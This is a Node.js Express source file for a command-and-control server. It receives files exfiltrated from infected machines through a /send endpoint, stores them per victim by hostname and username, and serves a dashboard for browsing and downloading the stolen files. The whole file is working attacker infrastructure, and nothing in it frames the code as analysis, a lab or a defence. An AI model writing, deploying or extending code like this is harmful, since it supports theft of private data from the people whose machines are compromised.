const express = require("express");
const fs = require("fs").promises;
const path = require("path");
const cors = require("cors");

const app = express();
app.use(cors());
app.use(express.json({ limit: "50mb" }));

// --- Determine folder path (Railway or local) ---
const VICTIMS_DIR = process.env.RAILWAY_VOLUME_MOUNT_PATH
  ? path.join(process.env.RAILWAY_VOLUME_MOUNT_PATH, "victims")
  : path.join(__dirname, "victims"); // fallback for local testing

// --- Read secret from environment or fallback for local ---
const SECRET_TOKEN = process.env.SECRET_TOKEN || "local_dev_token";
if (!process.env.SECRET_TOKEN) {
  console.warn("SECRET_TOKEN not set! Using local_dev_token (development only).");
}

// --- Ensure victims folder exists ---
(async () => {
  try {
    await fs.mkdir(VICTIMS_DIR, { recursive: true });
    console.log(`Victims folder ready at ${VICTIMS_DIR}`);
  } catch (err) {
    console.error("Failed to create victims folder:", err);
    process.exit(1);
  }
})();

// --- Root dashboard ---
app.get("/", async (req, res) => {
  if (req.headers.authorization !== `Bearer ${SECRET_TOKEN}`)
    return res.status(403).send("Unauthorized");

  let victims = [];
  try {
    victims = await fs.readdir(VICTIMS_DIR);
  } catch (err) {
    console.error("Failed to read victims folder:", err);
  }

  res.send(
    `<h2>C2 Dashboard — ${victims.length} victims</h2>
    <ul>${victims.map(v => `<li><a href="/victim/${v}">${v}</a></li>`).join("")}</ul>`
  );
});

// --- Receive exfiltrated file ---
app.post("/send", async (req, res) => {
  const { hostname, username, file, token } = req.body;
  if (token !== SECRET_TOKEN) return res.status(403).json({ error: "Unauthorized" });
  if (!file) return res.status(400).json({ error: "No file" });

  const safeFolder = path.basename(`${hostname}_${username}`);
  const safeFileName = file.name.replace(/\.\./g, "").replace(/[<>:"|?*]/g, "_");
  const victimDir = path.join(VICTIMS_DIR, safeFolder);
  const filePath = path.join(victimDir, safeFileName);

  try {
    await fs.mkdir(path.dirname(filePath), { recursive: true });
    await fs.writeFile(filePath, Buffer.from(file.content, "base64"));
    console.log(`[+] ${safeFolder} — saved ${safeFileName}`);
    res.json({ success: true });
  } catch (err) {
    console.error("Failed to save file:", err);
    res.status(500).json({ error: "Write failed" });
  }
});

// --- Root victim view ---
app.get("/victim/:id", async (req, res) => {
  const safeId = path.basename(req.params.id);
  const victimDir = path.join(VICTIMS_DIR, safeId);

  let items = [];
  try {
    items = await fs.readdir(victimDir, { withFileTypes: true });
  } catch (err) {
    console.error("Failed to read victim folder:", err);
    return res.status(404).send("Not found");
  }

  res.send(
    `<h2>Victim: ${safeId}</h2>
    <ul>${items.map(item => {
      const href = `/victim/${safeId}/${item.name}`;
      return `<li>${item.isDirectory() ? "📁 " : "📄 "}<a href="${href}">${item.name}</a></li>`;
    }).join("")}</ul>`
  );
});

// --- Handle all /victim/ paths (subfolders and files) ---
app.use("/victim/", async (req, res, next) => {
  // req.path has "/victim/" stripped by app.use
  // e.g., for /victim/ABC/file.txt, req.path = "ABC/file.txt" (no leading /)
  const pathStr = req.path.startsWith("/") ? req.path.slice(1) : req.path;
  const parts = pathStr.split("/").filter(Boolean);
  if (parts.length < 1) return next();

  const safeId = parts[0]; // victim id
  const subPath = parts.slice(1).join("/") || ""; // rest of path

  const victimDir = path.join(VICTIMS_DIR, safeId);
  const fullPath = path.join(victimDir, decodeURIComponent(subPath));

  // Security check
  if (!fullPath.startsWith(victimDir)) {
    return res.status(403).send("Invalid path");
  }

  console.log(`[DEBUG] req.path: ${req.path}`);
  console.log(`[DEBUG] Looking for: ${fullPath}`);
  console.log(`[DEBUG] VICTIMS_DIR: ${VICTIMS_DIR}`);
  console.log(`[DEBUG] safeId: ${safeId}`);
  console.log(`[DEBUG] subPath: ${subPath}`);

  try {
    const stats = await fs.stat(fullPath);
    if (stats.isDirectory()) {
      // Show folder listing
      const items = await fs.readdir(fullPath, { withFileTypes: true });
      const parentDir = subPath ? path.dirname(subPath) : "";
      const backLink = parentDir && parentDir !== "."
        ? `<a href="/victim/${safeId}/${parentDir.replace(/\\/g, "/")}">⬅️ ..</a><br>`
        : "";

      res.send(
        `<h2>Victim: ${safeId}/${subPath.replace(/\\/g, "/")}</h2>
        ${backLink}
        <ul>${items.map(item => {
          const href = `/victim/${safeId}/${path.join(subPath, item.name).replace(/\\/g, "/")}`;
          return `<li>${item.isDirectory() ? "📁 " : "📄 "}<a href="${href}">${item.name}</a></li>`;
        }).join("")}</ul>`
      );
    } else {
      // Download file
      res.download(fullPath, err => {
        if (err) {
          console.error("Download failed:", err);
          res.status(404).send("File not found");
        }
      });
    }
  } catch (err) {
    console.error("Path error:", err);
    // List what files actually exist
    try {
      const contents = await fs.readdir(victimDir, { recursive: true });
      console.log(`[DEBUG] Files in victim dir: ${contents.join(", ")}`);
    } catch (e) {}
    res.status(404).send("Not found");
  }
});

// --- Start server ---
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`C2 running on port ${PORT}`));